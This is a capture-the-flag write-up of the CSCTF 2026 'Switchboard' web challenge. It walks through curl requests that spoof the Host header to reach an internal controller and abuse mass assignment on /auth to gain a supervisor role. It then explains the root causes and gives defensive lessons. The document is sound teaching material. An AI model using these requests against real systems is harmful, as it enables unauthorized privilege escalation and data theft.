# CSCTF 2026 — Switchboard Writeup

**08/11/2026**

---

> **CTF:** CSCTF 2026  
>  **Challenge:** Switchboard  
>  **Category:** Web  
>  **Author:** Iulian Schifirnet  
>  **Team:** XREFctf  
>  **Writeup Author:** Mahmoud Adel

## Introduction

Hey everyone! My name is **Mahmoud Adel** — a cybersecurity enthusiast passionate about red teaming and CTFs. Today I’m walking through how I solved the **Switchboard** web challenge from **CSCTF 2026**.

Switchboard is a web challenge about an old voice exchange run by the Vardanne Joint Operations Directorate. The public board shows the state of the trunk circuits. There is a separate exchange controller that sits on the internal trunk, and that controller can export the current trunk crypto key — but only to a rostered supervisor. The goal is to reach the controller and export the key.

The public board itself is just informational. The interesting part is the boundary between the public board and the internal controller.

Let’s get right into it!

---

## Initial Reconnaissance

I started with the public board. It shows a table of trunk circuits, a maintenance page, and an “About” page. Nothing on the surface looked interesting — the circuits, incidents, and service endpoints are all static.

I opened the page source. In the JavaScript that reads the circuit status, I noticed a hardcoded hostname:

```javascript
var controller = atob("ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA==");
```

Decoding that string gives:

```text
exch-ctl.vjod.internal
```

So the public board already knew the internal hostname of the exchange controller. The comment around it claimed that the board could not reach the controller directly and had to use the public API. That suggested the challenge author was trying to make the internal hostname look useless, which is usually a hint that it is not.

I also checked the health endpoint:

```bash
curl http://<target>/healthz
```

Response:

```json
{"board":"2.3.1","node":"pub-07","status":"ok"}
```

Nothing sensitive was exposed here.

---

## Investigation and Exploitation

### Reaching the internal controller

The public board and the internal controller are served from the same listener. The difference is only in how the reverse proxy routes the request, and that routing was based on the `Host` header. So the “internal trunk only” restriction was really a virtual-host check, not a network restriction.

I tested this by sending the same request to the same port, but with a different `Host` header:

```bash
curl -s -H 'Host: exch-ctl.vjod.internal' http://<target>/ | head
```

This returned a completely different page — the exchange controller interface. The controller page included a table listing its own API:

| Method | Path | Purpose | Access |
| --- | --- | --- | --- |
| POST | `/auth` | Open an operator session. Body: `username`. | internal trunk |
| GET | `/operators` | Duty roster and your current session. | operator session |
| GET | `/export/trunk-key` | Export the current trunk crypto key. | supervisor |
| GET | `/healthz` | Liveness. | any |

The same page also contained a note about sessions:

> Sessions opened from inside the exchange network do not ask for a password. Each session carries the duty role of the desk it was opened from. Clear the `ctl_sid` cookie at the end of the shift to close the session.

Two things in that note mattered: sessions had no password, and the session role came from somewhere inside the request itself.

### Examining the session cookie

I opened a session with an arbitrary username:

```bash
curl -i -X POST -H 'Host: exch-ctl.vjod.internal' \
     -H 'Content-Type: application/json' \
     -d '{"username":"probe"}' \
     http://<target>/auth
```

The server replied:

```json
{"ok":true,"operator":"probe","role":"operator"}
```

with a `Set-Cookie` for `ctl_sid`. The cookie value had the standard Flask layout `payload.timestamp.signature`. For the smaller payloads I could decode the first segment as base64url, and it came out as:

```json
{"operator":"watch","role":"operator"}
```

So the session was carrying the role directly, and the payload was a signed Flask session.

I confirmed the role by calling the roster endpoint:

```bash
curl -s -H 'Host: exch-ctl.vjod.internal' \
     -b 'ctl_sid=<cookie>' \
     http://<target>/operators
```

That returned the roster plus a `role` field for my own session. It was always `operator`.

### Trying to raise the role

Calling `/export/trunk-key` as an operator returned:

```json
{"error":"supervisor role required to export the trunk key"}
```

The roster showed two rostered supervisors:

- `EX-01 · R. Antonescu` (on duty)
- `EX-15 · T. Novak` (off duty)

I tried opening sessions with those usernames, and with variations like `EX-01`, `R. Antonescu`, `supervisor`, `duty-supervisor`, `watch-supervisor`, and so on. Every time, the response from `/auth` was:

```json
{"ok":true,"operator":"<name>","role":"operator"}
```

The username never changed the role. Trying `X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, and `Forwarded` did not change the role either.

At that point I assumed the escalation had to come from the cookie itself. Since the cookie was a Flask signed session, I tried two things in parallel:

1. A quick set of “extra fields” attempts against `/auth` — sending additional JSON fields such as `role`, `desk`, `is_supervisor`, `supervisor`.
2. A local brute-force of the Flask `SECRET_KEY` using `itsdangerous`, so I could forge a cookie with `role: supervisor` if the key was weak.

### The mass assignment bypass

The first attempt in that quick set was:

```bash
curl -s -X POST -H 'Host: exch-ctl.vjod.internal' \
     -H 'Content-Type: application/json' \
     -d '{"username":"probe","role":"supervisor"}' \
     -c /tmp/jar \
     http://<target>/auth
```

The `/auth` response came back as:

```json
{"ok":true,"operator":"probe","role":"supervisor"}
```

The server had taken `role` straight from the request body and stored it in the session!

The session cookie that came back was a legitimate server-signed cookie with `role: supervisor`. I confirmed the change against `/operators` and then called the export endpoint:

```bash
curl -s -H 'Host: exch-ctl.vjod.internal' -b /tmp/jar \
     http://<target>/export/trunk-key
```

That returned the current trunk crypto key along with the flag.

The Flask `SECRET_KEY` brute-force turned out to be completely unnecessary, so I stopped it.

---

## Root Cause \& Technical Explanation

The `/auth` endpoint treated the `role` field of the request body as authoritative. It copied that field into the session without verifying it against the roster or overriding it on the server. The page text on the controller (*“Each session carries the duty role of the desk it was opened from”*) made it sound as though the role was determined by desk location or origin IP, but in reality the application blindly accepted whatever the caller sent.

This is a classic **mass assignment** vulnerability combined with a broken access-control assumption:

- The `/export/trunk-key` handler did enforce a “supervisor only” check.
- However, the role it verified was completely caller-controlled during session creation.

Furthermore, **virtual-host routing was mistaken for a security boundary**. The controller’s “internal trunk only” access control was enforced only through HTTP `Host` header routing rather than true network isolation or firewall rules. Because the public board and internal controller shared the same port/listener, any client capable of setting `Host: exch-ctl.vjod.internal` could reach the privileged management plane.

The complete exploit chain consisted of two simple steps:

1. **Virtual Host Spoofing:** Supplying `Host: exch-ctl.vjod.internal` to route the request through the reverse proxy to the internal controller.
2. **Mass Assignment:** Passing `"role": "supervisor"` in the `/auth` JSON payload to receive a valid session cookie signed with the supervisor role.

---

## Final Result \& Flag

With the forged supervisor session, calling `/export/trunk-key` returned the trunk encryption key and the flag:

```text
CSCTF{<REDACTED>}
```

The flag format was confirmed to match the competition specification. *(Note: The live flag string has been redacted per competition rules).*

---

## Conclusion \& Key Takeaways

This challenge highlights two critical architecture and implementation pitfalls:

1. **Virtual-host routing is not a security boundary:** Running internal admin interfaces on the same listener as public applications relying solely on `Host` header matching allows trivial external access via vhost spoofing. Internal interfaces should listen on dedicated, firewall-restricted loopback/VPN interfaces.
2. **Never trust client-supplied privilege fields:** User models or session objects must explicitly sanitize or whitelist bindable parameters. Administrative roles should only be assigned through server-authoritative databases or identity providers, never deserialized directly from untrusted request bodies.

---

## AI Methodology

During this challenge, I used an AI assistant for:

- Parsing the obfuscated JavaScript on the public board and identifying the base64-decoded hostname (`exch-ctl.vjod.internal`).
- Suggesting the `Host` header routing approach and generating Python enumeration scripts for testing `/auth` field variations.
- Generating the fallback Flask cookie brute-force script (which was abandoned once mass assignment worked).

All requests were executed manually against the instance from my own machine, and I read and verified the HTTP responses directly. The root cause analysis was confirmed against the server’s actual responses.

*No live flags, credentials, tokens, or instance URLs are included in this writeup.*

---

*Thanks for reading — hope this writeup helped someone learn something new. Happy hacking!*

[This post](https://m2hmoud2del.github.io/posts/csctf-2026-switchboard/) is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.
